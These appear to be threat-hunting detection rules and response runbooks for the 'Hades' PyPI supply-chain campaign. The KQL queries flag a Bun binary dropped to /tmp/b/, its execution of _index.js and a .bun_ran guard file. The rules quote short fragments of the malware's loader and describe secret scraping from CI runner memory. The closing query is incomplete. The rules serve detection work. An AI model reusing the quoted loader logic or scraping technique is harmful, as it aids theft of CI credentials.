1) TRIAGE: confirm the parent Python process and which package's __init__.py triggered the import (check InitiatingProcessCommandLine working dir; correlate with pip install events in the prior 24h). Pull SHA256 of /tmp/b/bun and check VT. 2) CONTAIN: isolate the host (especially if it is a CI runner with cloud credentials), revoke any short-lived OIDC tokens issued in the runner's session, rotate AWS/Azure/GCP keys exposed to that workflow. 3) HUNT: pivot on the AccountName/DeviceId for `.bun_ran` flag-file creation (UC3), bun child process running _index.js (UC2), and any /proc/*/mem reads against Runner.Worker (UC5). Pull the compromised package list and check pip install history against UC6.
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType == "FileCreated"
| where (FolderPath has "/tmp/b/" and FileName =~ "bun")
   or (FolderPath has "/tmp" and FileName =~ "b.zip")
| where InitiatingProcessFileName has_any ("python","python3","python3.9","python3.10","python3.11","python3.12","pythonw.exe","unzip")
| project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName,
          FileName, FolderPath, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType == "FileCreated"
| where (TargetFilePath has "/tmp/b/" and TargetFileName =~ "bun")
   or (TargetFilePath has "/tmp" and TargetFileName =~ "b.zip")
| where ActingProcessName has_any ("python","python3","unzip")
| project TimeGenerated, DvcHostname, ActorUsername,
          TargetFileName, TargetFilePath, TargetFileSHA256,
          ActingProcessName, ActingProcessCommandLine

Hades Campaign: Bun binary in /tmp/b/ executes _index.js payload AIInstallation High
Detects the Hades Campaign stage-2: the dropped Bun runtime at /tmp/b/bun invoked with `run _index.js` to launch the modular AES-256-GCM-decrypted payload. Distinguishes from legitimate Bun by both the unusual install path and the _index.js argument. Rationale: Article verbatim: `_s.run([_b, "run", _j], env=dict(_o.environ), check=False)` where `_b = /tmp/b/bun` and `_j` is the located `_index.js`. The combo of /tmp/b/bun executable path + `_index.js` argument is article-unique; legitimate Bun never runs out of /tmp/b/.
ATT&CKT1059.007 T1027 T1140
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer running Bun from a custom /tmp install during dev
  • Ephemeral container builds that stage Bun in /tmp/b/ for build steps
  • Internal CI tooling that intentionally drops Bun to /tmp/b/bun
  • Bun upstream test suites checking out under /tmp
Response runbook
1) TRIAGE: pull SHA256 of /tmp/b/bun and compare to oven-sh-published v1.3.14 hashes — Hades campaign uses an unmodified legit Bun binary, so the file is benign in isolation; the signal is the path + _index.js arg. Inspect /tmp/_index.js content and the parent Python process's working directory to identify which PyPI package triggered it. 2) CONTAIN: kill the bun PID, isolate host, revoke any GitHub Actions OIDC tokens, rotate secrets exported to the workflow's environment variables. 3) HUNT: enumerate DNS queries from this bun PID (C2 lookup), file writes (modular blob staging), and cross-host pivot on SHA256 of /tmp/_index.js.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where (FolderPath has "/tmp/b" and FileName =~ "bun")
   or ProcessCommandLine has "/tmp/b/bun"
| where ProcessCommandLine has "_index.js"
| project Timestamp, DeviceName, AccountName,
          FileName, FolderPath, ProcessCommandLine, SHA256,
          InitiatingProcessFileName, InitiatingProcessFolderPath,
          InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where (TargetProcessName has "/tmp/b/" and TargetProcessName endswith "/bun")
   or TargetProcessCommandLine has "/tmp/b/bun"
| where TargetProcessCommandLine has "_index.js"
| project TimeGenerated, DvcHostname, ActorUsername,
          TargetProcessName, TargetProcessCommandLine,
          ParentProcessName, ParentProcessCommandLine, SHA256

Hades Campaign: .bun_ran flag file created in temp directory AIInstallation High
Detects creation of the article's signature one-shot guard file `.bun_ran` in the system temp dir, written after the Bun payload runs once per boot to prevent re-execution. Extremely high-fidelity — the filename is unique to this campaign. Rationale: Article verbatim: `_G = _O.path.join(_T.gettempdir(), ".bun_ran")` and the closing line `open(_G, "w").close()`. The filename `.bun_ran` is a campaign-unique artifact — Google/grep returns no legitimate software using this exact name as a guard file.
ATT&CKT1480 T1027
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Detonation/sandbox runs of this same sample by an internal IR team
  • Threat researcher running deobfuscated POC on an instrumented box
  • Red team replaying Hades artifacts during a tabletop exercise
  • Backup/restore of a previously compromised host's /tmp
Response runbook
1) TRIAGE: pull the ContextImageFileName/InitiatingProcess and confirm whether the writer was python (matches campaign) or bun (less common but possible). Snapshot /tmp/_index.js, /tmp/b/bun, and the Python __init__.py that triggered the hook. 2) CONTAIN: isolate host immediately — guard-file existence proves the JS payload already executed, so credential-scraping modules have run. Force rotate ALL secrets reachable from this host (cloud keys, GitHub PATs, npm tokens, deploy keys). 3) HUNT: query the affected PyPI package install history (UC6), search for the SHA256 of /tmp/_index.js across the fleet, and look for outbound to github.com from non-developer hosts (potential exfil channel — same TA pattern from prior Miasma campaigns).

| order by Timestamp desc

| where EventType == "FileCreated"
| where TargetFileName =~ ".bun_ran"
| project TimeGenerated, DvcHostname, ActorUsername,
          TargetFileName, TargetFilePath,
